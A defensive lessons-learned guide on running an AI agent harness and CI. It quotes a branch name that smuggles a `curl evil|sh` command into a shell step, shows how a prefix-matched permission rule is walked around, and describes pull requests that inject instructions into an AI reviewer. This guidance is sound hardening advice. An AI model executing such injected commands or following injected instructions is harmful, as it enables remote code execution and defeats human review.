# Lessons learned

Things that went wrong, or nearly did, while running an agent harness on real repositories. Each entry is
the symptom you would notice, the cause, and what to do. Where a vendor document states the behavior, it is
linked.

## Instruction files

### A rule without `paths:` loads in every session

**Symptom.** Context fills up and the agent applies a test convention while editing a migration.
**Cause.** A file in `.claude/rules/` without `paths:` frontmatter, or with YAML that does not parse, loads
unconditionally, and nothing warns you.
**Do.** Fail CI on a rule without `paths:` (the `instruction-files.yml` template does). Source:
https://code.claude.com/docs/en/memory#path-specific-rules

### A `CLAUDE.md` silently hides `AGENTS.md`

**Symptom.** Codex or another agent follows the conventions, Claude Code does not.
**Cause.** When a repository has a `CLAUDE.md`, Claude Code reads it instead of `AGENTS.md`. A `CLAUDE.md`
that says "read AGENTS.md" in words only works if the model decides to open it.
**Do.** Put `@AGENTS.md` on its own line in `CLAUDE.md`. Source: https://code.claude.com/docs/en/memory#agents-md

### A personal `CLAUDE.local.md` turns off `AGENTS.md`

**Symptom.** After adding personal notes, the agent forgets the project's conventions, for you only.
**Cause.** `CLAUDE.local.md` counts as a `CLAUDE.md` file, so automatic `AGENTS.md` loading stops.
**Do.** Keep a `CLAUDE.md` that imports `AGENTS.md`; then `CLAUDE.local.md` adds to it instead of hiding it.

### An instruction typed in the chat disappears after compaction

**Symptom.** Halfway through a long session the agent stops following something you told it.
**Cause.** After `/compact`, only the project-root `CLAUDE.md` is re-read from disk; chat-only instructions
are summarized away, and nested files and rules reload only on a matching read.
**Do.** If it matters for more than this message, put it in a file. The second time you type the same
correction, write it down (the `add-rule` skill helps).

### Two lines that disagree, and the agent picks one

**Symptom.** The agent alternates between two styles or two commands.
**Cause.** Instruction files are concatenated, not overridden. A contradiction between `AGENTS.md` and a
rule is resolved arbitrarily.
**Do.** One home per instruction. Run the `contradictions` check of the `audit` skill after edits.

### A global gitignore swallows the harness

**Symptom.** Everything works on your machine; teammates and CI see no rules, no settings, no skills.
**Cause.** Many personal global gitignores exclude `.claude/`, so `git add` skips the project's
`.claude/settings.json`, rules and skills without a word.
**Do.** Add `!.claude/` (or the exact paths) to the repository's `.gitignore`, keep
`.claude/settings.local.json` ignored, and check with `git check-ignore -v .claude/settings.json`.

### The commit identity is not the one in `git config`

**Symptom.** Commits in a repository meant to be anonymous or public carry your personal name and email.
**Cause.** `GIT_AUTHOR_*` and `GIT_COMMITTER_*` environment variables override `user.name` and `user.email`
from any config file.
**Do.** Check `git log --format='%an <%ae>'` before the first push of a new repository, and scan the whole
history, not only the files, for anything personal.

## Permissions and hooks

### A Bash permission rule is easy to walk around

**Symptom.** An `ask` rule on `git push` never prompts, yet pushes happen.
**Cause.** Bash rules match the command text by prefix with wildcards. `Bash(git push *)` does not match
`git -C . push origin main`.
**Do.** Use rules for convenience and as a first line; enforce what must never happen in a `PreToolUse`
hook that parses the command, and in CI. Source: https://code.claude.com/docs/en/permissions

### Blocking in `PostToolUse` blocks nothing

**Symptom.** The hook fires, prints an error, and the file is still changed.
**Cause.** `PostToolUse` runs after the tool; the action already happened.
**Do.** Block in `PreToolUse` with exit code 2. Use `PostToolUse` to check or format. Source:
https://code.claude.com/docs/en/hooks

### A hook that errors lets the action through

**Symptom.** A guard hook "works" until a machine without `jq`.
**Cause.** Exit code 2 blocks; any other failure is a non-blocking error and the action goes ahead.
**Do.** Test every hook by piping sample JSON into it, including the cases that must pass.

## CI

### A check that cannot fail is not a check

**Symptom.** Everything is green, and the thing the check guards is broken.
**Cause.** `continue-on-error: true`, an `if:` that skips the job, or a step that swallows its exit code.
**Do.** Review the workflow, not the badge. Treat any skip condition on a required check as a finding.

### A required check behind a path filter blocks unrelated pull requests

**Symptom.** A pull request that does not touch the filtered paths waits forever on "Pending".
**Cause.** A workflow skipped by a `paths:` filter never reports, and a required check that never reports
blocks the merge.
**Do.** Do not path-filter workflows whose checks are required; make the job cheap instead. Source:
https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs

### The skip marker in a squash body turns off main

**Symptom.** After a merge, no CI, release or deploy ran on `main`.
**Cause.** GitHub skips `push` and `pull_request` workflows when the commit message contains the skip
marker (the words "skip ci" in square brackets), and the body counts. A pull request about the release
process tends to quote it.
**Do.** Never write the marker literally in a pull request body or squash message; describe it in words.
Run a scheduled watchdog that checks every merge on `main` got its post-merge runs.

### A pull request in conflict runs no `pull_request` workflows

**Symptom.** Only one or two checks appear on a pull request; the rest are missing, not failed.
**Cause.** `pull_request` workflows run on the merge ref, which GitHub cannot build while the branch
conflicts. `pull_request_target` workflows still run. Filtering checks by "not successful" returns nothing
and reads as green.
**Do.** When checks are missing, look at the mergeable state first, and count checks, not failures.

### A new workflow does not run on older pull requests

**Symptom.** You merged a new `pull_request` workflow and open pull requests do not run it.
**Cause.** `pull_request` workflows are read from the pull request's head branch.
**Do.** Test a new workflow with a fresh pull request based on current `main`, or update the old branch.

### Two green pull requests break `main` together

**Symptom.** Each pull request passed; after both merged, `main` has two migration heads or a broken
lockfile.
**Cause.** Each was tested against `main`, not against the other.
**Do.** Require branches to be up to date before merging, or use a merge queue.

### Tags move

**Symptom.** A workflow that did not change starts behaving differently, or worse.
**Cause.** `uses: owner/action@v1` follows whatever the tag points to today.
**Do.** Pin every third-party action by commit SHA with the version in a comment, and let Dependabot
update them. Read the pinned version's `action.yml` before using an input.

### Untrusted text inside `run:` is code

**Symptom.** None, until a branch named `x";curl evil|sh;"` runs in your CI.
**Cause.** `${{ github.head_ref }}` or a title inside `run:` is pasted into the shell before it runs.
**Do.** Pass such values through `env:` and quote the variable. Source:
https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions

## LLM review

### The model reports problems that are not there

**Symptom.** A confident finding cites a line that does not exist or says something it does not say.
**Cause.** Models summarize; a summary can be wrong.
**Do.** Require a verbatim quote per finding and drop blocking findings whose quote is not in the file.

### The pull request can talk to the reviewer

**Symptom.** A review approves something it should not, or follows an instruction hidden in a comment.
**Cause.** Everything in the pull request is author-controlled, including a `CLAUDE.md` it adds, which an
agent run on that tree loads as instructions.
**Do.** Strip agent configuration and symlinks from the reviewed tree, take the prompt and conventions from
the base branch, and treat any text that tries to direct the reviewer as a finding.

### Turning on a blocking AI check on day one

**Symptom.** The team learns to ignore the check, or bypasses it.
**Cause.** Precision is unknown until measured, and early false positives cost trust.
**Do.** Run in shadow mode first (neutral check, real text), measure, tune, then switch to blocking.

## Working with an agent

### Most review findings are regressions from the same pull request's fixes

**Symptom.** Round after round of review, each round with new findings.
**Cause.** A fix breaks its neighbor; checks are run once at the end, so nobody sees which fix broke what.
**Do.** Verify after each fix. Before pushing, re-read the call sites and siblings of everything touched.
Group related findings into one commit and aim for two rounds.

### A report is a claim, not proof

**Symptom.** A decision built on an agent's summary turns out to be wrong.
**Cause.** A subagent's report, a commit message or a green badge is compressed; the evidence did not
survive the summary.
**Do.** Before acting on a claim that carries the decision, open the source it cites.
